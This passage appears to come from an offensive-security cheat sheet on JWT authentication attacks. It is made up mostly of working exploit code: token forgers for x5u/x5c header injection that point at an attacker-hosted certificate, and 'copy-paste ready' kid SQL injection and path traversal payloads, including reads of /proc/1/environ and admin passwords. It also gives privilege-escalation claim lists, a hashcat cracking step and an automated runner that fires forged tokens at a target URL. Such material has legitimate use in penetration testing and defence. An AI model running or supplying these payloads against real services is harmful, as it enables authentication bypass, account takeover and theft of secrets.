---

## x5u / x5c Header Injection

### x5u (X.509 URL) Attack
The `x5u` header points to a URL hosting the X.509 certificate chain. If the server fetches and trusts arbitrary URLs:

```python
#!/usr/bin/env python3
"""JWT x5u header injection — generate self-signed cert and forged token."""
import jwt
import json
import base64
import subprocess
import tempfile
import os

def generate_x5u_token(original_token, claims_override, attacker_url):
    """Forge JWT using x5u header pointing to attacker-controlled cert."""
    # Generate self-signed cert + key
    tmp = tempfile.mkdtemp()
    key_path = os.path.join(tmp, "key.pem")
    cert_path = os.path.join(tmp, "cert.pem")

    subprocess.run([
        "openssl", "req", "-x509", "-newkey", "rsa:2048", "-keyout", key_path,
        "-out", cert_path, "-days", "1", "-nodes", "-subj", "/CN=attacker"
    ], capture_output=True)

    with open(key_path) as f:
        private_key = f.read()
    with open(cert_path) as f:
        cert_pem = f.read()

    # Decode original token claims
    payload = jwt.decode(original_token, options={"verify_signature": False})
    payload.update(claims_override)

    # Create cert chain for x5u endpoint (host this at attacker_url)
    cert_der = base64.b64encode(
        subprocess.run(["openssl", "x509", "-in", cert_path, "-outform", "DER"],
                      capture_output=True).stdout
    ).decode()
    print(f"[*] Host this at {attacker_url}:")
    print(json.dumps({"keys": [{"x5c": [cert_der]}]}, indent=2))

    # Forge token with x5u header
    token = jwt.encode(payload, private_key, algorithm="RS256",
                       headers={"x5u": attacker_url, "typ": "JWT"})
    return token

# Usage:
# token = generate_x5u_token(original_jwt, {"sub": "admin"}, "https://attacker.com/certs")
```

### x5c (Embedded Certificate) Attack
The `x5c` header embeds the certificate directly in the JWT header:

```python
#!/usr/bin/env python3
"""JWT x5c header injection — embed self-signed cert in JWT header."""
import jwt
import json
import base64
import subprocess
import tempfile
import os

def generate_x5c_token(original_token, claims_override):
    """Forge JWT with x5c header embedding attacker's certificate."""
    tmp = tempfile.mkdtemp()
    key_path = os.path.join(tmp, "key.pem")
    cert_path = os.path.join(tmp, "cert.pem")

    subprocess.run([
        "openssl", "req", "-x509", "-newkey", "rsa:2048", "-keyout", key_path,
        "-out", cert_path, "-days", "1", "-nodes", "-subj", "/CN=admin"
    ], capture_output=True)

    with open(key_path) as f:
        private_key = f.read()

    # Get cert in DER format, base64 encode
    cert_der = subprocess.run(
        ["openssl", "x509", "-in", cert_path, "-outform", "DER"],
        capture_output=True
    ).stdout
    cert_b64 = base64.b64encode(cert_der).decode()

    payload = jwt.decode(original_token, options={"verify_signature": False})
    payload.update(claims_override)

    token = jwt.encode(payload, private_key, algorithm="RS256",
                       headers={"x5c": [cert_b64], "typ": "JWT"})
    return token
```

---

## Key ID (kid) SQL Injection & Path Traversal

The `kid` (Key ID) header tells the server which key to use for verification. If it's used in a database query or file path without sanitization:

### kid SQL Injection
```python
import jwt
import base64

# kid used in SQL query: SELECT key FROM keys WHERE kid='<kid>'
# Inject to control the returned key value

# Payload 1: Return empty string as key
token = jwt.encode(
    {"sub": "admin", "role": "admin"},
    "",  # Sign with empty string
    algorithm="HS256",
    headers={"kid": "' UNION SELECT '' -- "}
)

# Payload 2: Return known string as key
secret = "ATTACKER_CONTROLLED"
token = jwt.encode(
    {"sub": "admin"},
    secret,
    algorithm="HS256",
    headers={"kid": f"' UNION SELECT '{secret}' -- "}
)

# Payload 3: Return from another table
token = jwt.encode(
    {"sub": "admin"},
    "known_value",
    algorithm="HS256",
    headers={"kid": "' UNION SELECT password FROM users WHERE username='admin' -- "}
)
```

### kid Path Traversal
```python
import jwt

# kid used to read key file: open(f"/keys/{kid}.pem")
# Traverse to known-content file

# /dev/null → empty file → sign with empty string
token = jwt.encode(
    {"sub": "admin"},
    "",
    algorithm="HS256",
    headers={"kid": "../../../../../../../dev/null"}
)

# /proc/sys/kernel/randomize_va_space → contains "2\n"
token = jwt.encode(
    {"sub": "admin"},
    "2\n",
    algorithm="HS256",
    headers={"kid": "../../../../../../../proc/sys/kernel/randomize_va_space"}
)
```

### kid + SQLi Payloads (Copy-Paste Ready)
```
../../../../../../../dev/null
' UNION SELECT '' --
' UNION SELECT 'secret' --
../../../../../../etc/hostname
/proc/1/environ
```

---

## Custom Claim Escalation

Common JWT claim fields to modify for privilege escalation:

### Standard Claims
```json
{"sub": "administrator"}
{"sub": "admin"}
{"sub": "root"}
```

### Role/Permission Claims
```json
{"role": "admin"}
{"role": "administrator"}
{"roles": ["admin", "superuser"]}
{"is_admin": true}
{"admin": true}
{"isAdmin": true}
{"permissions": ["read", "write", "admin", "delete"]}
{"scope": "admin:all openid profile"}
{"groups": ["administrators"]}
{"privilege": 0}
{"access_level": 9999}
{"tier": "enterprise"}
```

### Multi-Tenant / Context Claims
```json
{"tenant_id": "target_tenant"}
{"org_id": "admin_org"}
{"company_id": 1}
{"account_type": "premium"}
```

### User Identity Claims
```json
{"user_id": 1}
{"uid": 0}
{"email": "admin@target.com"}
{"username": "administrator"}
{"name": "Admin User"}
```

### Composite Escalation (try multiple at once)
```json
{
    "sub": "admin",
    "role": "administrator",
    "is_admin": true,
    "permissions": ["*"],
    "scope": "admin",
    "exp": 9999999999
}
```

---

## JWT Attack Chain — Complete Decision Tree

Systematic 10-step sequence to find and exploit JWT vulnerabilities:

```
Step 1: Decode JWT header and payload
    → Record: algorithm, kid, jku, jwk, x5u, x5c, claims
    ↓
Step 2: Test unverified signature
    → Modify claims (sub=admin), keep original signature
    → If accepted → FULL BYPASS (done)
    ↓
Step 3: Test none algorithm
    → Set alg:"none"/"None"/"NONE"/"nOnE", remove signature
    → Keep trailing dot: header.payload.
    → If accepted → FULL BYPASS (done)
    ↓
Step 4: Test weak HMAC secret
    → hashcat -a 0 -m 16500 jwt.txt wordlist.txt
    → Try: secret, secret1, password, key, jwt_secret, changeme
    → Python quick test with common passwords
    → If cracked → forge with discovered secret (done)
    ↓
Step 5: Test kid path traversal
    → kid: "../../../dev/null" → sign with empty string
    → kid: "../../../proc/sys/kernel/randomize_va_space" → sign with "2\n"
    → If accepted → FULL BYPASS (done)
    ↓
Step 6: Test kid SQL injection
    → kid: "' UNION SELECT '' -- " → sign with empty string
    → kid: "' UNION SELECT 'secret' -- " → sign with 'secret'
    → If accepted → FULL BYPASS (done)
    ↓
Step 7: Test algorithm confusion (RS256 → HS256)
    → Fetch public key from /jwks.json or /.well-known/jwks.json
    → Convert to PEM → Use as HMAC secret with HS256
    → If accepted → FULL BYPASS (done)
    ↓
Step 8: Test JWK header injection
    → Generate RSA keypair → embed public key in jwk header
    → Sign with corresponding private key
    → If accepted → FULL BYPASS (done)
    ↓
Step 9: Test x5u / x5c header injection
    → Generate self-signed cert
    → x5u: point to attacker URL hosting cert
    → x5c: embed cert directly in header
    → If accepted → FULL BYPASS (done)
    ↓
Step 10: Test JKU injection
    → Generate RSA keypair → host JWKS at attacker URL
    → Set jku header to attacker URL
    → If accepted → FULL BYPASS (done)
    ↓
Step 11: Test JWE nested token attack (if token has 5 dot-separated parts = JWE)
    → Fetch server's public encryption key from JWKS endpoint
    → Craft PlainJWT (alg:"none") with admin claims
    → Wrap PlainJWT inside valid JWE (RSA-OAEP-256 + A128GCM or per JWKS)
    → Server decrypts JWE but may skip inner JWT signature verification
    → If accepted → FULL BYPASS (done)
```

### Quick Python Runner for All Attacks
```python
#!/usr/bin/env python3
"""Run all JWT attacks in sequence against a target."""
import jwt
import json
import base64
import requests
import hashlib

def attack_jwt(original_token, target_url, auth_header="Authorization"):
    """Systematically try all JWT attacks."""
    header = jwt.get_unverified_header(original_token)
    payload = jwt.decode(original_token, options={"verify_signature": False})

    admin_payload = dict(payload)
    admin_payload["sub"] = "administrator"
    if "role" in admin_payload:
        admin_payload["role"] = "admin"
    if "is_admin" in admin_payload:
        admin_payload["is_admin"] = True

    attacks = []

    # Attack 1: Unverified signature
    forged = jwt.encode(admin_payload, "doesntmatter", algorithm="HS256")
    attacks.append(("Unverified signature", forged))

    # Attack 2: None algorithm
    h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
    p = base64.urlsafe_b64encode(json.dumps(admin_payload).encode()).decode().rstrip('=')
    attacks.append(("None algorithm", f"{h}.{p}."))
    for alg_var in ["None", "NONE", "nOnE"]:
        h2 = base64.urlsafe_b64encode(json.dumps({"alg":alg_var,"typ":"JWT"}).encode()).decode().rstrip('=')
        attacks.append((f"None variant ({alg_var})", f"{h2}.{p}."))

    # Attack 3: Weak secrets
    for secret in ["", "secret", "secret1", "password", "admin", "key", "jwt_secret",
                    "changeme", "test", "123456", "JWT_SECRET", "token_secret"]:
        try:
            forged = jwt.encode(admin_payload, secret, algorithm="HS256")
            attacks.append((f"Weak secret: '{secret}'", forged))
        except Exception:
            pass

    # Attack 4: kid path traversal (sign with empty string)
    try:
        forged = jwt.encode(admin_payload, "", algorithm="HS256",
                           headers={"kid": "../../../../../../../dev/null"})
        attacks.append(("kid traversal (/dev/null)", forged))
    except Exception:
        pass

    # Attack 5: kid SQLi (sign with empty string)
    try:
        forged = jwt.encode(admin_payload, "", algorithm="HS256",
                           headers={"kid": "' UNION SELECT '' -- "})
        attacks.append(("kid SQLi (empty key)", forged))
    except Exception:
        pass

    # Test each attack
    for name, token in attacks:
        try:
            r = requests.get(target_url, headers={
                auth_header: f"Bearer {token}"
            }, timeout=10, allow_redirects=False)
            status = r.status_code
            success = status in [200, 302] and "unauthorized" not in r.text.lower()
            marker = "[+]" if success else "[-]"
            print(f"  {marker} {name}: HTTP {status} ({len(r.text)} bytes)")
            if success:
                print(f"      TOKEN: {token[:80]}...")
        except Exception as e:
            print(f"  [!] {name}: Error - {e}")
